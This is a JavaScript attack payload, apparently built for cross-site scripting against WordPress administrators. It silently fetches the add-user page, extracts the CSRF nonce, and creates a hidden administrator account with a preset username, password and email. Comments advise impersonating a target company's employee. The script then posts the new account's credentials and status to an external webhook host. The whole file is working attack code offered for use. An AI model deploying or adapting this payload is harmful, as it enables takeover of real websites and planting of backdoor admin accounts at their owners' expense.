
var Callback = "https://gentle-mouse-28.webhook.cool/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

function WPXCreateAccount() {

        
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", "/wp-admin/user-new.php", false);
        _stage1.send();

        var Username = "slavpedIiceum";         // Ex: operator (It is recommended to use a valid employee name from the target company).
        var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
        var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
        var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
        var FirstName = ""; // (optional)
        var LastName = "";  // (optional)
        
        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];

            if (csrf_token) {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", "/wp-admin/user-new.php", false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send("action=createuser&_wpnonce_create-user=" +
                    csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
                    encodeURIComponent(Username) + "&email=" +
                    encodeURIComponent(Email) + "&first_name=" +
                    encodeURIComponent(FirstName) + "&last_name=" +
                    encodeURIComponent(LastName) + "&url=&pass1=" +
                    encodeURIComponent(Password) + "&pass2=" +
                    encodeURIComponent(Password) + "&pw_weak=on&role=" +
                    Role + "&createuser=Add%2BNew%2BUser");

                if (_stage2.responseText.match("already registered")) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host":  "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[ERROR] Stage 2 - Unable to create the user!.",
                                    "About": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else if (_stage2.responseText.match(Username)[0]) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[Sucessful] The user has been successfully created!.",
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[ERROR] Stage 2 - Unable to create the user!.",
                                    "About": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {

                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": "wp-admin/user-new.php",
                                "Module": "WPCreateAccount.WPXCreateAccount()",
                                "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                "Data": {
                                    "User": Username,
                                    "Email": Email,
                                    "Password": Password,
                                    "Role": Role,
                                    "FirstName": FirstName,
                                    "LastName": LastName
                                },
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": "wp-admin/user-new.php",
                            "Module": "WPCreateAccount.WPXCreateAccount()",
                            "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }
}
WPXCreateAccount()
